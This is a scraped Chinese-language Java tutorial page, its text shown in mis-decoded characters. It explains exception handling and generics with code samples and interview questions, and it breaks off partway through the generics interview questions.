                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    7
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»10åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">ä¸€ã€å¼‚å¸¸ï¼ˆExceptionï¼‰</h3>
<p>å¼‚å¸¸æ˜¯ Java å¤„ç†ç¨‹åºè¿è¡Œæ—¶é”™è¯¯çš„æ ¸å¿ƒæœºåˆ¶ï¼Œä¼ä¸šå¼€å‘ä¸­è¦æ±‚ç²¾å‡†æ•è·ã€åˆç†æŠ›å‡ºã€è§„èŒƒå¤„ç†ï¼Œé¿å…ç¨‹åºå´©æºƒæˆ–éšè—é—®é¢˜ã€‚</p>
<h4 data-id="heading-1">1. æ ¸å¿ƒä»£ç ç¤ºä¾‹ï¼ˆåˆ†ç±»å¤„ç† + è‡ªå®šä¹‰å¼‚å¸¸ï¼‰</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.io.FileInputStream;
<span class="hljs-keyword">import</span> java.io.FileNotFoundException;
<span class="hljs-keyword">import</span> java.io.IOException;

<span class="hljs-comment">/**
 * å¼‚å¸¸æ ¸å¿ƒç¤ºä¾‹ï¼š
 * 1. ç¼–è¯‘æ—¶å¼‚å¸¸ï¼ˆæ£€æŸ¥å‹ï¼‰å¤„ç†ï¼ˆtry-catch/throwsï¼‰
 * 2. è¿è¡Œæ—¶å¼‚å¸¸ï¼ˆéæ£€æŸ¥å‹ï¼‰å¤„ç†
 * 3. è‡ªå®šä¹‰ä¸šåŠ¡å¼‚å¸¸
 */</span>
<span class="hljs-comment">// è‡ªå®šä¹‰ä¸šåŠ¡å¼‚å¸¸ï¼ˆä¼ä¸šä¸­ç”¨äºæ ‡è¯†ç‰¹å®šä¸šåŠ¡é”™è¯¯ï¼‰</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">BusinessException</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">RuntimeException</span> {
    <span class="hljs-comment">// å¸¦é”™è¯¯ä¿¡æ¯çš„æ„é€ æ–¹æ³•</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">BusinessException</span><span class="hljs-params">(String message)</span> {
        <span class="hljs-built_in">super</span>(message);
    }
    <span class="hljs-comment">// å¸¦é”™è¯¯ä¿¡æ¯+æ ¹å› çš„æ„é€ æ–¹æ³•ï¼ˆä¾¿äºæ’æŸ¥é—®é¢˜ï¼‰</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">BusinessException</span><span class="hljs-params">(String message, Throwable cause)</span> {
        <span class="hljs-built_in">super</span>(message, cause);
    }
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ExceptionDemo</span> {
    <span class="hljs-comment">// è¯»å–æ–‡ä»¶ï¼ˆæŠ›å‡ºç¼–è¯‘æ—¶å¼‚å¸¸ï¼Œç”±è°ƒç”¨æ–¹å¤„ç†ï¼‰</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readFile</span><span class="hljs-params">(String path)</span> <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-keyword">if</span> (path == <span class="hljs-literal">null</span> || !path.endsWith(<span class="hljs-string">".txt"</span>)) {
            <span class="hljs-comment">// æŠ›å‡ºè¿è¡Œæ—¶å¼‚å¸¸ï¼ˆå‚æ•°éæ³•ï¼‰</span>
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">"æ–‡ä»¶è·¯å¾„éæ³•ï¼Œå¿…é¡»æ˜¯txtæ–‡ä»¶"</span>);
        }
        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(path);
        fis.close();
    }

    <span class="hljs-comment">// å¤„ç†ä¸šåŠ¡é€»è¾‘ï¼ˆå°è£…åº•å±‚å¼‚å¸¸ä¸ºä¸šåŠ¡å¼‚å¸¸ï¼‰</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doBusiness</span><span class="hljs-params">(String filePath)</span> {
        <span class="hljs-keyword">try</span> {
            readFile(filePath);
            System.out.println(<span class="hljs-string">"æ–‡ä»¶è¯»å–æˆåŠŸï¼Œä¸šåŠ¡å¤„ç†å®Œæˆ"</span>);
        } <span class="hljs-keyword">catch</span> (IllegalArgumentException e) {
            <span class="hljs-comment">// æ•è·å‚æ•°å¼‚å¸¸ï¼ŒåŒ…è£…ä¸ºä¸šåŠ¡å¼‚å¸¸æŠ›å‡ºï¼ˆç»Ÿä¸€å¼‚å¸¸ç±»å‹ï¼‰</span>
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BusinessException</span>(<span class="hljs-string">"ä¸šåŠ¡å¤„ç†å¤±è´¥ï¼šå‚æ•°é”™è¯¯"</span>, e);
        } <span class="hljs-keyword">catch</span> (FileNotFoundException e) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BusinessException</span>(<span class="hljs-string">"ä¸šåŠ¡å¤„ç†å¤±è´¥ï¼šæ–‡ä»¶ä¸å­˜åœ¨"</span>, e);
        } <span class="hljs-keyword">catch</span> (IOException e) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BusinessException</span>(<span class="hljs-string">"ä¸šåŠ¡å¤„ç†å¤±è´¥ï¼šæ–‡ä»¶è¯»å–å¼‚å¸¸"</span>, e);
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// æµ‹è¯•å¼‚å¸¸å¤„ç†</span>
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// æµ‹è¯•1ï¼šå‚æ•°é”™è¯¯ï¼ˆè¿è¡Œæ—¶å¼‚å¸¸ï¼‰</span>
            <span class="hljs-comment">// doBusiness("test.doc");</span>
            <span class="hljs-comment">// æµ‹è¯•2ï¼šæ–‡ä»¶ä¸å­˜åœ¨ï¼ˆç¼–è¯‘æ—¶å¼‚å¸¸ï¼‰</span>
            doBusiness(<span class="hljs-string">"none.txt"</span>);
        } <span class="hljs-keyword">catch</span> (BusinessException e) {
            <span class="hljs-comment">// ç»Ÿä¸€æ•è·ä¸šåŠ¡å¼‚å¸¸ï¼Œæ‰“å°é”™è¯¯ä¿¡æ¯å’Œæ ¹å› </span>
            System.err.println(<span class="hljs-string">"é”™è¯¯ä¿¡æ¯ï¼š"</span> + e.getMessage());
            <span class="hljs-comment">// æ‰“å°å¼‚å¸¸æ ˆï¼ˆæ’æŸ¥é—®é¢˜ç”¨ï¼‰</span>
            e.printStackTrace();
        }
    }
}
</code></pre>
<p><strong>ä»£ç è¯´æ˜</strong>ï¼š</p>
<ul>
<li><strong>å¼‚å¸¸åˆ†ç±»</strong>ï¼šç¼–è¯‘æ—¶å¼‚å¸¸ï¼ˆ<code>IOException</code>/<code>FileNotFoundException</code>ï¼‰å¿…é¡»æ˜¾å¼å¤„ç†ï¼ˆtry-catch/throwsï¼‰ï¼›è¿è¡Œæ—¶å¼‚å¸¸ï¼ˆ<code>IllegalArgumentException</code>/<code>NullPointerException</code>ï¼‰å¯ä¸ç”¨æ˜¾å¼å¤„ç†ï¼Œä½†ä¼ä¸šä¸­å»ºè®®ä¸»åŠ¨æ•è·ã€‚</li>
<li><strong>è‡ªå®šä¹‰å¼‚å¸¸</strong>ï¼šä¼ä¸šä¸­ä¼šä¸ºä¸åŒä¸šåŠ¡åœºæ™¯å®šä¹‰ä¸“å±å¼‚å¸¸ï¼ˆå¦‚<code>UserNotFoundException</code>ã€<code>OrderException</code>ï¼‰ï¼Œä¾¿äºç»Ÿä¸€å¼‚å¸¸å¤„ç†å’Œå‰ç«¯é”™è¯¯æç¤ºã€‚</li>
<li><strong>å¼‚å¸¸åŒ…è£…</strong>ï¼šåº•å±‚å¼‚å¸¸ï¼ˆå¦‚ IO å¼‚å¸¸ï¼‰åŒ…è£…ä¸ºä¸šåŠ¡å¼‚å¸¸æŠ›å‡ºï¼Œé¿å…ä¸Šå±‚æ„ŸçŸ¥åº•å±‚å®ç°ç»†èŠ‚ï¼Œç¬¦åˆ â€œé¢å‘ä¸šåŠ¡ç¼–ç¨‹â€ æ€æƒ³ã€‚</li>
</ul>
<h4 data-id="heading-2">2. ä¼ä¸šé¢è¯•é¢˜</h4>
<ol>
<li>
<p>é—®ï¼šç¼–è¯‘æ—¶å¼‚å¸¸å’Œè¿è¡Œæ—¶å¼‚å¸¸çš„åŒºåˆ«ï¼Ÿä¼ä¸šä¸­å¦‚ä½•å¤„ç†ï¼Ÿç­”ï¼š</p>
<ul>
<li>ç¼–è¯‘æ—¶å¼‚å¸¸ï¼ˆChecked Exceptionï¼‰ï¼šç»§æ‰¿<code>Exception</code>ï¼ˆé RuntimeExceptionï¼‰ï¼Œç¼–è¯‘æœŸå¼ºåˆ¶å¤„ç†ï¼ˆtry-catch/throwsï¼‰ï¼Œå¦‚<code>IOException</code>ã€<code>SQLException</code>ï¼›</li>
<li>è¿è¡Œæ—¶å¼‚å¸¸ï¼ˆUnchecked Exceptionï¼‰ï¼šç»§æ‰¿<code>RuntimeException</code>ï¼Œç¼–è¯‘æœŸä¸å¼ºåˆ¶å¤„ç†ï¼Œå¦‚<code>NullPointerException</code>ã€<code>IndexOutOfBoundsException</code>ï¼›</li>
<li>ä¼ä¸šå¤„ç†åŸåˆ™ï¼šç¼–è¯‘æ—¶å¼‚å¸¸è¦ä¹ˆæ•è·å¤„ç†ï¼Œè¦ä¹ˆæŠ›ç»™ä¸Šå±‚å¹¶è¯´æ˜æ–‡æ¡£ï¼›è¿è¡Œæ—¶å¼‚å¸¸ä¼˜å…ˆé¢„é˜²ï¼ˆå¦‚åˆ¤ç©ºï¼‰ï¼Œå…³é”®èŠ‚ç‚¹ä¸»åŠ¨æ•è·ï¼Œé¿å…ç¨‹åºå´©æºƒã€‚</li>
</ul>
</li>
<li>
<p>é—®ï¼štry-catch-finally ä¸­ï¼Œfinally ä¸€å®šä¼šæ‰§è¡Œå—ï¼Ÿreturn åœ¨ finally å‰æ‰§è¡Œä¼šæ€æ ·ï¼Ÿç­”ï¼šfinally<strong>å‡ ä¹</strong>ä¸€å®šä¼šæ‰§è¡Œï¼Œé™¤é JVM é€€å‡ºï¼ˆå¦‚<code>System.exit(0)</code>ï¼‰ï¼›è‹¥ try/catch ä¸­æœ‰ returnï¼Œä¼šå…ˆæ‰§è¡Œ return çš„è¡¨è¾¾å¼è®¡ç®—ï¼Œå†æ‰§è¡Œ finallyï¼Œæœ€åè¿”å›ï¼ˆè‹¥ finally ä¸­æœ‰ returnï¼Œä¼šè¦†ç›–åŸ return å€¼ï¼Œä¼ä¸šä¸­ç¦æ­¢è¿™ä¹ˆåšï¼‰ã€‚</p>
</li>
<li>
<p>é—®ï¼šthrow å’Œ throws çš„åŒºåˆ«ï¼Ÿç­”ï¼š<code>throw</code>æ˜¯è¯­å¥ï¼Œæ‰‹åŠ¨æŠ›å‡ºå…·ä½“å¼‚å¸¸å¯¹è±¡ï¼ˆå¦‚<code>throw new BusinessException("é”™è¯¯")</code>ï¼‰ï¼›<code>throws</code>æ˜¯æ–¹æ³•å£°æ˜ï¼Œå£°æ˜è¯¥æ–¹æ³•å¯èƒ½æŠ›å‡ºçš„å¼‚å¸¸ç±»å‹ï¼Œå‘ŠçŸ¥è°ƒç”¨æ–¹éœ€è¦å¤„ç†ã€‚</p>
</li>
<li>
<p>é—®ï¼šä¼ä¸šä¸­ä¸ºä»€ä¹ˆè¦è‡ªå®šä¹‰å¼‚å¸¸ï¼Ÿç­”ï¼šç»Ÿä¸€å¼‚å¸¸ç±»å‹ï¼Œä¾¿äºå…¨å±€å¼‚å¸¸å¤„ç†ï¼ˆå¦‚ Spring çš„<code>@ControllerAdvice</code>ï¼‰ï¼›åŒºåˆ†ä¸åŒä¸šåŠ¡é”™è¯¯åœºæ™¯ï¼Œæ–¹ä¾¿å®šä½é—®é¢˜ï¼›å¯æºå¸¦ä¸šåŠ¡é”™è¯¯ç  / ä¿¡æ¯ï¼Œé€‚é…å‰ç«¯é”™è¯¯æç¤ºã€‚</p>
</li>
</ol>
<h4 data-id="heading-3">3. ä¼ä¸šå®é™…åº”ç”¨åœºæ™¯</h4>
<ol>
<li><strong>å…¨å±€å¼‚å¸¸å¤„ç†</strong>ï¼šSpring Boot é¡¹ç›®ä¸­ç”¨<code>@ControllerAdvice</code>+<code>@ExceptionHandler</code>ç»Ÿä¸€æ•è·æ‰€æœ‰å¼‚å¸¸ï¼Œè¿”å›æ ‡å‡†åŒ–é”™è¯¯å“åº”ï¼ˆé”™è¯¯ç  + é”™è¯¯ä¿¡æ¯ï¼‰ã€‚</li>
<li><strong>ä¸šåŠ¡æµç¨‹æ ¡éªŒ</strong>ï¼šä¸‹å•æ—¶è‹¥åº“å­˜ä¸è¶³ï¼ŒæŠ›å‡º<code>StockInsufficientException</code>ï¼›ç™»å½•æ—¶è‹¥ç”¨æˆ·åå¯†ç é”™è¯¯ï¼ŒæŠ›å‡º<code>AuthFailedException</code>ã€‚</li>
<li><strong>èµ„æºæ“ä½œå®¹é”™</strong>ï¼šæ•°æ®åº“æ“ä½œï¼ˆ<code>SQLException</code>ï¼‰ã€æ–‡ä»¶æ“ä½œï¼ˆ<code>IOException</code>ï¼‰æ•è·åï¼Œè®°å½•æ—¥å¿—å¹¶è½¬æ¢ä¸ºä¸šåŠ¡å¼‚å¸¸ï¼Œé¿å…æš´éœ²åº•å±‚æ•æ„Ÿä¿¡æ¯ã€‚</li>
<li><strong>å‚æ•°æ ¡éªŒ</strong>ï¼šæ¥å£å…¥å‚æ ¡éªŒå¤±è´¥æ—¶ï¼ŒæŠ›å‡º<code>IllegalArgumentException</code>æˆ–è‡ªå®šä¹‰<code>ParamValidException</code>ï¼Œé…åˆæ ¡éªŒæ¡†æ¶ï¼ˆå¦‚ Hibernate Validatorï¼‰ä½¿ç”¨ã€‚</li>
</ol>
<h3 data-id="heading-4">äºŒã€æ³›å‹ï¼ˆGenericï¼‰</h3>
<p>æ³›å‹æ˜¯ JDK 5 + ç‰¹æ€§ï¼Œæ ¸å¿ƒä½œç”¨æ˜¯ â€œç±»å‹å‚æ•°åŒ–â€ï¼Œé¿å…ç±»å‹å¼ºè½¬ï¼Œæå‡ä»£ç å¤ç”¨æ€§å’Œç±»å‹å®‰å…¨æ€§ï¼Œæ˜¯é›†åˆã€æ¡†æ¶çš„åŸºç¡€ã€‚</p>
<h4 data-id="heading-5">1. æ ¸å¿ƒä»£ç ç¤ºä¾‹ï¼ˆæ³›å‹ç±» / æ–¹æ³• / æ¥å£ + é€šé…ç¬¦ï¼‰</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> java.<span class="hljs-property">util</span>.<span class="hljs-property">ArrayList</span>;
<span class="hljs-keyword">import</span> java.<span class="hljs-property">util</span>.<span class="hljs-property">List</span>;

<span class="hljs-comment">/**
 * æ³›å‹æ ¸å¿ƒç¤ºä¾‹ï¼š
 * 1. æ³›å‹ç±»
 * 2. æ³›å‹æ–¹æ³•
 * 3. æ³›å‹æ¥å£
 * 4. æ³›å‹é€šé…ç¬¦ï¼ˆ? extends/superï¼‰
 */</span>
<span class="hljs-comment">// 1. æ³›å‹ç±»ï¼šé€šç”¨æ•°æ®åŒ…è£…ç±»</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">DataWrapper</span>&lt;T&gt; {
    <span class="hljs-keyword">private</span> T data;

    <span class="hljs-keyword">public</span> <span class="hljs-title class_">DataWrapper</span>(T data) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">data</span> = data;
    }

    <span class="hljs-keyword">public</span> T <span class="hljs-title function_">getData</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">return</span> data;
    }

    <span class="hljs-comment">// æ³›å‹æ–¹æ³•ï¼šç‹¬ç«‹äºç±»çš„æ³›å‹</span>
    <span class="hljs-keyword">public</span> &lt;E&gt; <span class="hljs-built_in">void</span> <span class="hljs-title function_">printData</span>(<span class="hljs-params">E extraData</span>) {
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"æ ¸å¿ƒæ•°æ®ï¼š"</span> + data + <span class="hljs-string">"ï¼Œé¢å¤–æ•°æ®ï¼š"</span> + extraData);
    }
}

<span class="hljs-comment">// 2. æ³›å‹æ¥å£</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Converter</span>&lt;F, T&gt; {
    T <span class="hljs-title function_">convert</span>(F <span class="hljs-keyword">from</span>);
}

<span class="hljs-comment">// æ³›å‹æ¥å£å®ç°ï¼šStringè½¬Integer</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">StringToIntConverter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Converter</span>&lt;<span class="hljs-title class_">String</span>, <span class="hljs-title class_">Integer</span>&gt; {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Integer</span> <span class="hljs-title function_">convert</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> <span class="hljs-keyword">from</span></span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">Integer</span>.<span class="hljs-built_in">parseInt</span>(<span class="hljs-keyword">from</span>);
    }
}

<span class="hljs-comment">// 3. æ³›å‹é€šé…ç¬¦ç¤ºä¾‹</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">GenericUtil</span> {
    <span class="hljs-comment">// ä¸Šç•Œé€šé…ç¬¦ï¼šåªèƒ½è¯»å–ï¼Œä¸èƒ½æ·»åŠ ï¼ˆé™¤äº†nullï¼‰</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">printList</span>(<span class="hljs-params">List&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-built_in">Number</span>&gt; list</span>) {
        <span class="hljs-keyword">for</span> (<span class="hljs-title class_">Number</span> num : list) {
            <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">print</span>(num + <span class="hljs-string">" "</span>);
        }
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>();
        <span class="hljs-comment">// list.add(10); // ç¼–è¯‘é”™è¯¯ï¼šæ— æ³•ç¡®å®šå…·ä½“ç±»å‹</span>
    }

    <span class="hljs-comment">// ä¸‹ç•Œé€šé…ç¬¦ï¼šåªèƒ½æ·»åŠ ï¼Œè¯»å–æ—¶åªèƒ½è½¬Object</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">addIntToList</span>(<span class="hljs-params">List&lt;? <span class="hljs-variable language_">super</span> Integer&gt; list</span>) {
        list.<span class="hljs-title function_">add</span>(<span class="hljs-number">10</span>);
        list.<span class="hljs-title function_">add</span>(<span class="hljs-number">20</span>);
        <span class="hljs-comment">// Integer num = list.get(0); // ç¼–è¯‘é”™è¯¯ï¼šåªèƒ½è½¬Object</span>
    }
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GenericDemo</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"><span class="hljs-built_in">String</span>[] args</span>) {
        <span class="hljs-comment">// æ³›å‹ç±»ä½¿ç”¨</span>
        <span class="hljs-title class_">DataWrapper</span>&lt;<span class="hljs-title class_">String</span>&gt; strWrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataWrapper</span>&lt;&gt;(<span class="hljs-string">"é»‘é©¬ç¨‹åºå‘˜"</span>);
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(strWrapper.<span class="hljs-title function_">getData</span>()); <span class="hljs-comment">// æ— éœ€å¼ºè½¬</span>
        strWrapper.<span class="hljs-title function_">printData</span>(<span class="hljs-number">123</span>); <span class="hljs-comment">// æ³›å‹æ–¹æ³•ï¼šEè‡ªåŠ¨æ¨æ–­ä¸ºInteger</span>

        <span class="hljs-comment">// æ³›å‹æ¥å£ä½¿ç”¨</span>
        <span class="hljs-title class_">Converter</span>&lt;<span class="hljs-title class_">String</span>, <span class="hljs-title class_">Integer</span>&gt; converter = <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringToIntConverter</span>();
        <span class="hljs-title class_">Integer</span> num = converter.<span class="hljs-title function_">convert</span>(<span class="hljs-string">"100"</span>);
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"å­—ç¬¦ä¸²è½¬æ•°å­—ï¼š"</span> + num);

        <span class="hljs-comment">// æ³›å‹é€šé…ç¬¦ä½¿ç”¨</span>
        <span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">Integer</span>&gt; intList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
        intList.<span class="hljs-title function_">add</span>(<span class="hljs-number">1</span>);
        intList.<span class="hljs-title function_">add</span>(<span class="hljs-number">2</span>);
        <span class="hljs-title class_">GenericUtil</span>.<span class="hljs-title function_">printList</span>(intList); <span class="hljs-comment">// ä¸Šç•Œé€šé…ç¬¦ï¼šNumberçš„å­ç±»éƒ½å¯ä¼ å…¥</span>

        <span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">Object</span>&gt; objList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
        <span class="hljs-title class_">GenericUtil</span>.<span class="hljs-title function_">addIntToList</span>(objList); <span class="hljs-comment">// ä¸‹ç•Œé€šé…ç¬¦ï¼šIntegerçš„çˆ¶ç±»éƒ½å¯ä¼ å…¥</span>
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"æ·»åŠ ååˆ—è¡¨ï¼š"</span> + objList);
    }
}
</code></pre>
<p><strong>ä»£ç è¯´æ˜</strong>ï¼š</p>
<ul>
<li>
<p><strong>æ³›å‹ç±»</strong>ï¼š<code>DataWrapper&lt;T&gt;</code>Â å¯åŒ…è£…ä»»æ„ç±»å‹æ•°æ®ï¼Œé¿å…ä¸º String/Integer ç­‰åˆ†åˆ«å†™åŒ…è£…ç±»ï¼Œæå‡å¤ç”¨æ€§ã€‚</p>
</li>
<li>
<p><strong>æ³›å‹æ–¹æ³•</strong>ï¼š<code>&lt;E&gt; void printData(E extraData)</code>Â ç‹¬ç«‹äºç±»çš„æ³›å‹ï¼Œè°ƒç”¨æ—¶è‡ªåŠ¨æ¨æ–­ç±»å‹ï¼Œçµæ´»åº¦æ›´é«˜ã€‚</p>
</li>
<li>
<p><strong>é€šé…ç¬¦</strong>ï¼š</p>
<ul>
<li><code>? extends Number</code>ï¼ˆä¸Šç•Œï¼‰ï¼šåªèƒ½è¯»å–ï¼Œé€‚åˆ â€œç”Ÿäº§è€…â€ åœºæ™¯ï¼ˆå¦‚éå†è¾“å‡ºï¼‰ï¼›</li>
<li><code>? super Integer</code>ï¼ˆä¸‹ç•Œï¼‰ï¼šåªèƒ½æ·»åŠ ï¼Œé€‚åˆ â€œæ¶ˆè´¹è€…â€ åœºæ™¯ï¼ˆå¦‚æ·»åŠ å…ƒç´ ï¼‰ã€‚</li>
</ul>
</li>
<li>
<p><strong>ç±»å‹å®‰å…¨</strong>ï¼šæ³›å‹åœ¨ç¼–è¯‘æœŸæ£€æŸ¥ç±»å‹ï¼Œé¿å…è¿è¡Œæ—¶<code>ClassCastException</code>ï¼ˆå¦‚é›†åˆä¸­å­˜ String å´å– Integerï¼‰ã€‚</p>
</li>
</ul>
<h4 data-id="heading-6">2. ä¼ä¸šé¢è¯•é¢˜</h4>
<ol>
<li>
<p>é—®ï¼šæ³›å‹çš„ä½œç”¨ï¼Ÿä¸ºä»€ä¹ˆè¦ä½¿ç”¨æ³›å‹ï¼Ÿç­”ï¼š</p>
<ul>
<li>ç±»å‹å®‰å…¨ï¼šç¼–è¯‘æœŸæ£€æŸ¥ç±»å‹ï¼Œé¿å…è¿è¡Œæ—¶ç±»å‹è½¬æ¢å¼‚å¸¸ï¼›</li>
<li>ä»£ç å¤ç”¨ï¼šä¸€å¥—ä»£ç é€‚é…å¤šç§ç±»å‹ï¼ˆå¦‚ List/Listï¼‰ï¼›</li>
